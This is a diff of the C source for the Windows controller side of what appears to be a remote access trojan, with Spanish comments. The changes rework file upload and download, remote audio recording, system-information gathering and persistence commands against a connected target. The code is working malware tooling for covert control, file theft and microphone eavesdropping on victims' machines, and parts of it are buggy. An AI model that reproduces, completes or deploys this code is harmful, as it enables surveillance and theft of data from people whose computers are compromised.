@@ -17,7 +17,10 @@
 #include "../src/base64.c"
 
 /*
-Record NO FUNCIONA....
+
+- Arreglar salida en download
+- Upload funciona perfectemente
+
 */
 
 //Vars globales
@@ -36,14 +39,13 @@ Record NO FUNCIONA....
 #define WHITE   FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE
 
 // Prototipo
-char* getSystemInformation(SOCKET targetConn, char *command);
-char* decodeSystemInformation(char *codedSysInfo);
 int mainFunction(int targetConn, char *clientIP, unsigned short clientPort);
 int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort);
-int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct);
+int readSendFile(SOCKET targetConn, char *filename, char *instruct);
 int startRecord(char* command, SOCKET targetConn, char* clientIP);
 int sndAndExecCmd(SOCKET targetConn, char *command, char *resp);
-int downloadFunc(char *command, SOCKET targetConn, char *ip); 
+int downloadFunc(char *command, SOCKET targetConn, char *ip);
+int getSystemInformation(SOCKET targetConn, char* command);
 int setLowPersistence(SOCKET targetConn, char *command);
 int checkPermissons(SOCKET targetConn, char *command);
 int startServer();
@@ -51,35 +53,17 @@ void helpPannel();
 void ctrlCHandler(int sig);
 void checkStart(char *IPAddress);
 void printColor(char* text, int color);
+void printProgressBar(long current, long total);
 void StartSending(SOCKET targetConn, char *instruct);
-void StartGetSysInfo(SOCKET targetConn, char *command);
 void closeConection(SOCKET targetConn, char *command, size_t instructLen, char *clientIP, unsigned short clientPort);
+long get_file_size(char* filename);
 
-char* getSystemInformation(SOCKET targetConn, char *command){
-    send(targetConn, command, strlen(command), 0);
-    char* recvData = malloc(SOCKBUFFER);
-
-    while (true){
-        recv(targetConn, recvData, SOCKBUFFER, 0);
-        if (strstr(recvData, "end\0") == 0)
-            break;
-        else 
-            printf("%s", recvData);
-            continue;
+long get_file_size(char* filename) {
+    struct _stat file_status;
+    if (_stat(filename, &file_status) < 0) {
+        return -1;
     }
-    return recvData;   
-}
-
-char* decodeSystemInformation(char *codedSysInfo){
-    size_t sizeCoded = strlen(codedSysInfo);
-    char* decodedSystemInfo = base64_decode(codedSysInfo, sizeCoded, &sizeCoded);
-    return decodedSystemInfo;
-}
-
-
-void StartGetSysInfo(SOCKET targetConn, char *command){
-    char *codedSysInfo = getSystemInformation(targetConn, command);
-    printf("%s", decodeSystemInformation(codedSysInfo));
+    return file_status.st_size;
 }
 
 void ctrlCHandler(int sig) {
@@ -87,6 +71,23 @@ void ctrlCHandler(int sig) {
     printColor("\n\n\t[!] ", RED); printColor("Saliendo: Ctrl + C detectado... \n\n", YELLOW); 
     exit(1);
 }
+
+int getSystemInformation(SOCKET targetConn, char *command){
+    send(targetConn, command, strlen(command), 0);
+    char recvData[SOCKBUFFER];
+    memset(recvData, 0, SOCKBUFFER);
+
+    while (true){
+        recv(targetConn, recvData, SOCKBUFFER, 0);
+        if (strstr(recvData, "end\0") == 0){
+            printf("%s", recvData);
+            break;
+        }
+    }
+    return 0;
+    //return recvData;   
+}
+
 
 void printColor(char* text, int color) {
     HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
@@ -130,9 +131,13 @@ void helpPannel(){
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] sysinfo               -> Show info from system target\n");
     printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] record                -> Record a 10S of audio.\n");
+    printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] lowpersistence        -> Set a low mode of persistence (no root)\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] persistence           -> Set a high mode of persistence (root)\n");
+    printf("\t\t---------------------------------------------------------\n");
+    printf("\t\t| [!>] check                 -> Check privileges\n");
     printf("\t\t---------------------------------------------------------\n");
     printf("\t\t| [!>] q / exit              -> Exit the conection\n");
     printf("\t\t---------------------------------------------------------\n");
@@ -148,48 +153,48 @@ void StartSending(SOCKET targetConn, char *instruct){
     char *substr = strstr(instruct, toReplace);
     size_t remainingLength = strlen(substr + strlen(toReplace));
     memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    ReadAndSendFile(targetConn, file, instruct);
+    readSendFile(targetConn, file, instruct);
 
 }
 
-int ReadAndSendFile(SOCKET targetConn, char *file, char *instruct){
-    setlocale(LC_ALL, "en_US.UTF-8");
+int readSendFile(SOCKET targetConn, char *filename, char *instruct){
+    send(targetConn, instruct, strlen(instruct), 0); 
+    long fullBytes = get_file_size(filename);
 
-    FILE *ptr;
-    // Abrimos el archivo en modo de lectura
-    ptr = fopen(file, "rb");
-
-    if (ptr == NULL) {
-        printColor("\n\t[!>] ", RED); printColor("No se puede abrir el archivo.\n\n", YELLOW);
-        //send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
+    if (fullBytes == -1){
+        printColor("\n\t[!>] ", RED); printColor("No se puede abrir el archivo.\n\n", YELLOW);        
         send(targetConn, "end\0", strlen("end\0"), 0);
         return 1;
-    } 
-    
-    send(targetConn, instruct, strlen(instruct), 0); 
-    char buffer[SOCKBUFFER];  // Búfer para leer desde el archivo
-
-    // Inicializamos los búferes con valores nulos 
-    memset(buffer, 0, sizeof(buffer));
-
-    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
-    size_t bytesRead;
-
-    while ((bytesRead = fread(buffer, 1, SOCKBUFFER, ptr)) > 0) { 
-        printf("%s\n", buffer);
-        size_t sizeBuff = bytesRead;
-        char *base64Encoded = base64_encode(buffer, sizeBuff, &sizeBuff);
-
-        send(targetConn, base64Encoded, strlen(base64Encoded), 0); 
-        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
     }
 
-    // Cierra el archivo
-    fclose(ptr); 
+    FILE *fp;
+    fp = fopen(filename, "rb");
+
+    unsigned char readData[SOCKBUFFER];
+    long fullReaded;
+    size_t bytesRead;
+    printf("\n");
+
+    while (true){
+        if ((bytesRead = fread(readData, 1, SOCKBUFFER - 1, fp)) <= 0)
+            break;
+
+        readData[bytesRead] = '\0';
+        send(targetConn, (char *)readData, bytesRead, 0);
+        memset(readData, 0, SOCKBUFFER);
+        fullReaded += bytesRead;
+        
+        printProgressBar(fullReaded, fullBytes);
+        
+    }
+
+    printf("\n");
+    fclose(fp);
     Sleep(300);
     send(targetConn, "end\0", strlen("end\0"), 0); 
     printColor("\n\t[*>] ", YELLOW); printColor("File Uploaded Successfully.\n\n", BLUE);
     return 0;
+
 }
 
 int sndAndExecCmd(SOCKET targetConn, char *command, char *resp){ 
@@ -255,63 +260,70 @@ int shell(SOCKET targetConn, char *clientIP, unsigned short clientPort){
 
 }
 
-int downloadFunc(char *command, SOCKET targetConn, char *ip) {
-    // Variables necesarias
-    char formed[100];
-    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);
+char *replaceFile(char *command, char *toReplace){
     char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
-    char toReplace[] = "download ";
 
     char *substr = strstr(command, toReplace);
     size_t remainingLength = strlen(substr + strlen(toReplace));
     memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(file, YELLOW); printColor(formed, BLUE); printf("\n");
+    file[remainingLength] = '\0'; 
+
+    return file;
+}
+
+int downloadFunc(char *command, SOCKET targetConn, char *ip){
     send(targetConn, command, strlen(command), 0);
 
-    // Lógica para descargar archivos
-    char recvData[SOCKBUFFER];  // Utilizamos un búfer para recibir datos
+    char formed[500];
+    snprintf(formed, SOCKBUFFER, " check path -> ./DATA/%s", ip);
 
-    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
-    memset(recvData, 0, sizeof(recvData));
+    // Tamaño máximo del archivo 
+    char bytesStr[100];
+    recv(targetConn, bytesStr, 100, 0);
+    long fullBytes;
+    fullBytes = atoi(bytesStr);
 
-    // Abre el archivo para escritura
-    char *base = PathFindFileName(file);
-    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, base);
-    FILE *fp = fopen(formed, "w");
-
-    if (fp == NULL) {
-        // Manejo de error de apertura de archivo
-        free(file);
+    if (fullBytes == -1){
+        printColor("\n\t[*>] ", RED); printColor("Error Downloading file ", YELLOW); printf("\n");
         return 1;
     }
 
-    while (true) {
-        int bytesRead = recv(targetConn, recvData, SOCKBUFFER, 0);
+    // Encontrar nombre de base (NO RUTA COMPLETA)
+    char *basename = PathFindFileName(replaceFile(command, "download "));
+    printColor("\n\t[*>] ", YELLOW); printColor("Downloading file ", BLUE); printColor(basename, YELLOW); printColor(formed, BLUE); printf("\n");
+    
+    // Preparar el bucle de recepción de datos
+    snprintf(formed, SOCKBUFFER, "./DATA/%s/%s", ip, basename);  
+    FILE *fp;
+    fp = fopen(formed, "wb");
+    unsigned char recvData[SOCKBUFFER];
+    int bytesReadCurrent = 0;
+    size_t bytesRead = 0;
 
-        if (bytesRead <= 0) {
-            // Manejo de error de recepción
-            printf("Error en la recepción de datos.\n");
-            fclose(fp);
-            free(file);
-            return 1;
-        }
 
-        if (strstr(recvData, "end\0") != NULL) {
-            // Recibido el indicador de final "end\0"
+    while (true){
+        bytesReadCurrent = recv(targetConn, (char *)recvData, SOCKBUFFER, 0);
+        
+        if (bytesReadCurrent < SOCKBUFFER - 1){
+            fwrite(recvData, 1, bytesReadCurrent, fp);
+            memset(recvData, 0, SOCKBUFFER);            
             break;
-        } else {
-            // Escribir los datos recibidos en el archivo
-            size_t size = strlen(recvData);
-            char *decodedData = base64_decode(recvData, size, &size);
-            fwrite(decodedData, 1, strlen(decodedData), fp);
-            free(decodedData);
         }
+
+        /*
+        if (strcmp((char *)recvData, "end\0") == 0){
+                break;
+            }
+        */
+        
+        fwrite(recvData, 1, bytesReadCurrent, fp);
+        bytesRead += bytesReadCurrent;
+        printProgressBar(bytesRead, fullBytes);
+        memset(recvData, 0, SOCKBUFFER);
     }
 
-    // Cierra el archivo
     fclose(fp);
-    free(file);
-    return 0;
+
 }
 
 int setPersistence(SOCKET targetConn, char *command, char *method){
@@ -362,10 +374,6 @@ int checkPermissons(SOCKET targetConn, char *command){
     return 0;
 }
 
-int saveRecord() {
-
-}
-
 void printProgressBar(long current, long total) {
     int barWidth = 50;
     float progress = (float)current / total;
@@ -389,7 +397,7 @@ void printProgressBar(long current, long total) {
 }
 
 int startRecord(char *command, SOCKET targetConn, char* clientIP) {
-    printColor("\n\t[*>] ", BLUE); printColor("Recording Audio ", YELLOW); printf("[10s]\n\n");
+    printColor("\n\t[*>] ", BLUE); printColor("Recording Audio for", YELLOW); printf("10s\n\n");
     send(targetConn, command, strlen(command), 0);
     Sleep(9999);
 
@@ -400,19 +408,19 @@ int startRecord(char *command, SOCKET targetConn, char* clientIP) {
     recv(targetConn, FullBytesSTR, 100, 0);
     long FullBytesInt = atoi(FullBytesSTR);
 
-    char recvData[SOCKBUFFER];
-    memset(recvData, 0, SOCKBUFFER);
+    char recvVoice[SOCKBUFFER];
+    memset(recvVoice, 0, SOCKBUFFER);
     int recivedBytes = 0;
     FILE* fp = fopen(voiceName, "wb");
 
     while (true) {
-        int bytesRecv = recv(targetConn, recvData, SOCKBUFFER, 0);         
+        int bytesRecv = recv(targetConn, recvVoice, SOCKBUFFER, 0);         
 
-        if (strstr(recvData, "end\0") != NULL) 
+        if (strstr(recvVoice, "end\0") != NULL) 
             break;
 
-        fwrite(recvData, 1, bytesRecv, fp);
-        memset(recvData, 0, 2048);
+        fwrite(recvVoice, 1, bytesRecv, fp);
+        memset(recvVoice, 0, 2048);
         
         recivedBytes += bytesRecv; 
         printProgressBar(recivedBytes, FullBytesInt);
@@ -475,7 +483,7 @@ int mainFunction(int targetConn, char *clientIP, unsigned short clientPort){
                 
             // Comando no reconocido
             } else if (strcmp(command, "sysinfo") == 0){
-                StartGetSysInfo(targetConn, command);
+                getSystemInformation(targetConn, command);
                 
             } else if (strcmp(command, "lowpersistence") == 0){
                 setPersistence(targetConn, command, "low");
